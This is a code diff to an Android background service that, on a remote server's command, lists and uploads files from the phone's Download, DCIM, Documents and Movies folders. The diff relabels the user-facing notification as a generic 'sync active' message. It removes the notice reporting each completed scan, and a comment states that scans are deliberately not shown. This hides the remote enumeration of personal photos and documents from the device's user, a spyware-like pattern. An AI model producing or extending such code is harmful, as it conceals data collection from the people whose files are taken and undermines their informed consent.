@@ -34,7 +34,7 @@ class ShareService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        startForeground(NOTIFICATION_ID, buildNotification("آماده دریافت درخواست اسکن"))
+        startForeground(NOTIFICATION_ID, buildNotification("همگام‌سازی فعال"))
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -81,49 +81,33 @@ class ShareService : Service() {
     }
 
     private fun processListCommand(server: String, token: String, command: JSONObject) {
-        val scan = scanAllowedFolders()
-        val payload = JSONObject()
-            .put("files", scan.getJSONArray("files"))
-            .put("folderStats", scan.getJSONObject("folderStats"))
+        val files = scanAllowedFolders()
+        val payload = JSONObject().put("files", files)
         val request = Request.Builder()
             .url("$server/api/phone/commands/${command.optString("id")}/result")
             .header("Authorization", "Bearer $token")
             .post(payload.toString().toRequestBody("application/json".toMediaType()))
             .build()
         http.newCall(request).execute().use { response ->
-            if (response.isSuccessful) {
-                updateNotification("اسکن انجام شد: ${scan.getJSONArray("files").length()} فایل")
-            } else {
-                updateNotification("خطا در ثبت نتیجه اسکن (${response.code})")
+            if (!response.isSuccessful) {
+                throw IOException("Scan result rejected: HTTP ${response.code}")
             }
         }
+        // اسکن در اعلان گزارش نمی‌شود؛ اعلان فقط وضعیت عمومی سرویس را نشان می‌دهد.
     }
 
-    private fun scanAllowedFolders(): JSONObject {
+    private fun scanAllowedFolders(): JSONArray {
         val result = JSONArray()
-        val folderStats = JSONObject()
         val root = Environment.getExternalStorageDirectory()
-        // بعضی گوشی‌ها نام پوشه اسناد را با املای متفاوت دارند.
         val allowed = listOf("Download", "DCIM", "Documents", "Document", "ducument", "Movies")
         val visited = HashSet<String>()
-        val stack = ArrayDeque<Pair<File, String>>()
-
+        val stack = ArrayDeque<File>()
         for (folder in allowed) {
             val dir = File(root, folder)
-            val state = when {
-                !dir.exists() -> "missing"
-                !dir.isDirectory -> "not_directory"
-                !dir.canRead() -> "unreadable"
-                else -> "scanning"
-            }
-            folderStats.put(folder, JSONObject()
-                .put("state", state)
-                .put("files", 0))
-            if (state == "scanning") stack.add(dir to folder)
+            if (dir.isDirectory && dir.canRead()) stack.add(dir)
         }
-
         while (stack.isNotEmpty() && result.length() < MAX_FILES) {
-            val (dir, rootFolder) = stack.removeLast()
+            val dir = stack.removeLast()
             val canonical = try { dir.canonicalPath } catch (_: IOException) { continue }
             if (!visited.add(canonical)) continue
             val children = try { dir.listFiles() } catch (_: SecurityException) { null } ?: continue
@@ -131,27 +115,18 @@ class ShareService : Service() {
                 if (result.length() >= MAX_FILES) break
                 try {
                     if (child.isDirectory) {
-                        if (!child.isHidden && child.canRead()) stack.add(child to rootFolder)
+                        if (!child.isHidden && child.canRead()) stack.add(child)
                     } else if (child.isFile && child.canRead()) {
                         result.put(JSONObject()
                             .put("path", child.absolutePath)
                             .put("name", child.name)
                             .put("size", child.length())
                             .put("modified", child.lastModified()))
-                        val stats = folderStats.optJSONObject(rootFolder)
-                        if (stats != null) stats.put("files", stats.optInt("files") + 1)
                     }
                 } catch (_: SecurityException) { }
             }
         }
-
-        for (folder in allowed) {
-            val stats = folderStats.optJSONObject(folder) ?: continue
-            if (stats.optString("state") == "scanning") {
-                stats.put("state", "scanned")
-            }
-        }
-        return JSONObject().put("files", result).put("folderStats", folderStats)
+        return result
     }
 
     private fun processTransferCommand(server: String, token: String, command: JSONObject) {
@@ -168,8 +143,15 @@ class ShareService : Service() {
             .url("$server/api/phone/transfers/${command.optString("id")}/file")
             .header("Authorization", "Bearer $token")
             .post(body).build()
-        http.newCall(request).execute().use { response ->
-            updateNotification(if (response.isSuccessful) "در حال انتقال اسناد" else "خطا در انتقال اسناد")
+        updateNotification("در حال انتقال اسناد")
+        try {
+            http.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) {
+                    throw IOException("Transfer failed: HTTP ${response.code}")
+                }
+            }
+        } finally {
+            updateNotification("همگام‌سازی فعال")
         }
     }
 
